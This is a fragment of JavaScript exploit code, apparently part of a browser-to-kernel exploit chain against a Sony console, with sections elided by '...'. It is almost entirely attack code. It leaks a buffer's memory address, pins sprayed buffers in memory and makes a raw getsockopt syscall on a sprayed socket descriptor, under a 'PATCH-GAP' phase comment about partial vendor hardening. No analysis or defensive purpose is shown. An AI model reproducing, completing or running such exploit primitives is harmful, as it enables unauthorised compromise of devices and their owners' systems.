...
// Phase 2: PATCH-GAP. Even without root, if Sony hardened ONLY the
        ...
        if (params.get("probe") === "verbatim") {
            ...
            keepAlive.push(sotAb);
            new Uint8Array(sotAb).fill(0);
            VB("DIAG sotAb@ keepAlive=" + keepAlive.length);
            let sotAddr = null;
            try { sotAddr = bufAddr(sotAb); VB("DIAG sotAddr=" + sotAddr); }
            catch (e) { VB("DIAG bufAddr FAILED: " + (e && e.message)); throw e; }
            const g0v = sc(SYS.getsockopt, sprayFd, 0xffff, 0x3,
                sotAddr.add32(8), sotAddr).i32;
